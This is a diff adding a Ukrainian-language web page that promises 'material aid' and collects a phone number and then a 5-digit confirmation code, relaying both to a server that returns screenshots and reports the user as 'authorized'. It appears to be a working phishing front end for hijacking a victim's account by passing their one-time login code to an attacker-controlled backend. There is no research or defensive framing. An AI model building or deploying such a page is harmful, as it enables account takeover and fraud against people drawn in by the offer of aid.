@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Матеріальна допомога</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Nunito', sans-serif;
+    background: #fff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+  }
+
+  .page-icon {
+    font-size: 52px;
+    margin-bottom: 16px;
+    line-height: 1;
+  }
+
+  .page-title {
+    font-size: 20px;
+    font-weight: 500;
+    color: #111;
+    margin-bottom: 28px;
+    letter-spacing: 0.01em;
+  }
+
+  .card {
+    width: 100%;
+    max-width: 400px;
+    border: 1.5px solid #e0e0e0;
+    border-radius: 18px;
+    padding: 36px 32px 32px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 24px;
+    background: #fff;
+  }
+
+  .avatar {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+    background: #d9d9d9;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+  }
+
+  .avatar svg { width: 70px; height: 70px; }
+
+  .phone-field {
+    width: 100%;
+    background: #f5f5f5;
+    border-radius: 10px;
+    padding: 10px 16px 12px;
+  }
+
+  .phone-label {
+    font-size: 12px;
+    color: #888;
+    font-weight: 500;
+    margin-bottom: 4px;
+  }
+
+  .phone-input-wrap {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    width: 100%;
+  }
+
+  .flag { font-size: 20px; line-height: 1; }
+
+  .phone-code { color: #111; font-weight: 700; font-size: 17px; }
+
+  .phone-input {
+    background: transparent;
+    border: none;
+    outline: none;
+    font-size: 17px;
+    font-weight: 600;
+    color: #111;
+    font-family: 'Nunito', sans-serif;
+    width: 100%;
+    letter-spacing: 0.03em;
+  }
+
+  .phone-input::placeholder { color: #aaa; font-weight: 500; }
+
+  /* Code boxes */
+  .code-inputs {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin-top: 12px;
+  }
+
+  .code-box {
+    width: 52px;
+    height: 60px;
+    border-radius: 12px;
+    border: 1.5px solid #e0e0e0;
+    background: #f5f5f5;
+    color: #111;
+    font-size: 26px;
+    font-weight: 700;
+    text-align: center;
+    outline: none;
+    font-family: 'Nunito', sans-serif;
+    transition: border-color 0.18s, background 0.18s;
+    caret-color: transparent;
+  }
+
+  .code-box:focus {
+    border-color: #111;
+    background: #fff;
+  }
+
+  .code-box.filled {
+    border-color: #888;
+    background: #fff;
+  }
+
+  /* Step wrappers */
+  #step-phone, #step-code {
+    width: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 20px;
+  }
+
+  .code-hint {
+    font-size: 13px;
+    color: #888;
+    text-align: center;
+    margin-top: -8px;
+  }
+
+  /* Status */
+  .error   { color: #d32f2f; font-size: 13px; font-weight: 600; text-align: center; }
+  .success { color: #2e7d32; font-size: 13px; font-weight: 600; text-align: center; }
+  .loading { color: #555;    font-size: 13px; font-weight: 600; text-align: center; }
+
+  /* Button */
+  .btn-next {
+    width: 160px;
+    padding: 16px;
+    background: #111;
+    color: #fff;
+    border: none;
+    border-radius: 14px;
+    font-size: 18px;
+    font-weight: 700;
+    font-family: 'Nunito', sans-serif;
+    cursor: pointer;
+    transition: background 0.18s, transform 0.12s;
+  }
+
+  .btn-next:hover { background: #2a2a2a; }
+  .btn-next:active { transform: scale(0.97); }
+  .btn-next:disabled { background: #aaa; cursor: not-allowed; }
+
+  /* Chat bubble */
+  .chat-btn {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    width: 52px;
+    height: 52px;
+    background: #6b5fe2;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    box-shadow: 0 4px 16px rgba(107,95,226,0.4);
+    transition: background 0.2s, transform 0.15s;
+    border: none;
+  }
+
+  .chat-btn:hover { background: #5a4ed1; transform: scale(1.06); }
+  .chat-btn svg { width: 24px; height: 24px; fill: white; }
+</style>
+</head>
+<body>
+
+  <div class="page-icon">🔐</div>
+  <div class="page-title">Обробка даних</div>
+
+  <div class="card" id="card">
+    <!-- Avatar -->
+    <div class="avatar">
+      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="50" cy="36" r="20" fill="#b0b0b0"/>
+        <ellipse cx="50" cy="82" rx="30" ry="22" fill="#b0b0b0"/>
+      </svg>
+    </div>
+
+    <!-- Step 1: Phone -->
+    <div id="step-phone">
+      <div class="phone-field">
+        <div class="phone-label">Номер телефону</div>
+        <div class="phone-input-wrap">
+          <span class="flag">🇺🇦</span>
+          <span class="phone-code">+380</span>
+          <input class="phone-input" type="tel" id="phone" placeholder="00 000 0000" maxlength="12">
+        </div>
+      </div>
+      <div id="status-phone" style="display:none;"></div>
+      <button class="btn-next" id="btn-phone" onclick="handleSendCode()">Далі</button>
+    </div>
+
+    <!-- Step 2: Code -->
+    <div id="step-code" style="display:none;">
+      <div class="phone-field" style="text-align:center;">
+        <div class="phone-label" style="text-align:center;">Код підтвердження</div>
+        <div class="code-inputs">
+          <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+          <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+          <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+          <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+          <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
+        </div>
+      </div>
+      <p class="code-hint">Введіть код, який надійшов на ваш телефон</p>
+      <div id="status-code" style="display:none;"></div>
+      <button class="btn-next" id="btn-code" onclick="handleVerifyCode()">Підтвердити</button>
+    </div>
+  </div>
+
+  <button class="chat-btn" title="Підтримка">
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+      <path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H6l-2 2V4h16v10z"/>
+    </svg>
+  </button>
+
+  <script>
+    // --- Step 1: Phone ---
+    document.getElementById('phone').addEventListener('input', function () {
+      this.value = this.value.replace(/[^\d\s\-()]/g, '');
+    });
+
+    async function handleSendCode() {
+      let phone = document.getElementById('phone').value.replace(/\D/g, '');
+
+      if (phone.length < 9) {
+        setStatus('status-phone', 'error', '❌ Введіть коректний номер телефону');
+        return;
+      }
+
+      const btn = document.getElementById('btn-phone');
+      btn.disabled = true;
+      btn.textContent = 'Підключаємось...';
+      setStatus('status-phone', 'loading', '⏳ Надсилаємо запит...');
+
+      try {
+        const response = await fetch('/send-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone })
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+          if (data.screenshotBefore) appendScreenshot(data.screenshotBefore);
+          if (data.screenshot) appendScreenshot(data.screenshot);
+
+          document.getElementById('step-phone').style.display = 'none';
+          document.getElementById('step-code').style.display = 'flex';
+          setStatus('status-code', 'success', '✅ Код надіслано на ваш телефон');
+
+          // Фокус на першу клітинку
+          document.querySelectorAll('.code-box')[0].focus();
+        } else {
+          setStatus('status-phone', 'error', '❌ ' + (data.error || 'Помилка сервера'));
+          btn.disabled = false;
+          btn.textContent = 'Далі';
+        }
+      } catch (err) {
+        setStatus('status-phone', 'error', '❌ Сервер недоступний');
+        btn.disabled = false;
+        btn.textContent = 'Далі';
+      }
+    }
+
+    // --- Step 2: Code boxes ---
+    document.querySelectorAll('.code-box').forEach((box, i, boxes) => {
+      box.addEventListener('input', () => {
+        box.value = box.value.replace(/\D/g, '');
+        if (box.value) {
+          box.classList.add('filled');
+          if (i < boxes.length - 1) boxes[i + 1].focus();
+        } else {
+          box.classList.remove('filled');
+        }
+      });
+
+      box.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !box.value && i > 0) {
+          boxes[i - 1].value = '';
+          boxes[i - 1].classList.remove('filled');
+          boxes[i - 1].focus();
+        }
+      });
+
+      box.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, boxes.length);
+        [...pasted].forEach((char, j) => {
+          if (boxes[i + j]) {
+            boxes[i + j].value = char;
+            boxes[i + j].classList.add('filled');
+          }
+        });
+        const next = boxes[Math.min(i + pasted.length, boxes.length - 1)];
+        next.focus();
+      });
+    });
+
+    async function handleVerifyCode() {
+      const boxes = document.querySelectorAll('.code-box');
+      const code = [...boxes].map(b => b.value).join('');
+
+      if (code.length < 5) {
+        setStatus('status-code', 'error', '❌ Введіть повний код підтвердження');
+        return;
+      }
+
+      const btn = document.getElementById('btn-code');
+      btn.disabled = true;
+      btn.textContent = 'Перевіряємо...';
+      setStatus('status-code', 'loading', '⏳ Перевіряємо код...');
+
+      try {
+        const response = await fetch('/verify-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code })
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+          setStatus('status-code', 'success', '✅ Успішно авторизовано!');
+          if (data.screenshot) appendScreenshot(data.screenshot);
+        } else {
+          setStatus('status-code', 'error', '❌ ' + (data.error || 'Невірний код'));
+          boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
+          boxes[0].focus();
+          btn.disabled = false;
+          btn.textContent = 'Підтвердити';
+        }
+      } catch (err) {
+        setStatus('status-code', 'error', '❌ Сервер недоступний');
+        btn.disabled = false;
+        btn.textContent = 'Підтвердити';
+      }
+    }
+
+    // --- Helpers ---
+    function setStatus(id, type, text) {
+      const el = document.getElementById(id);
+      el.className = type;
+      el.innerHTML = text;
+      el.style.display = 'block';
+    }
+
+    function appendScreenshot(base64) {
+      const img = document.createElement('img');
+      img.src = 'data:image/png;base64,' + base64;
+      img.style.cssText = 'width:100%;border-radius:12px;margin-top:8px;border:1px solid #e0e0e0';
+      document.getElementById('card').appendChild(img);
+    }
+  </script>
+
+</body>
+</html>
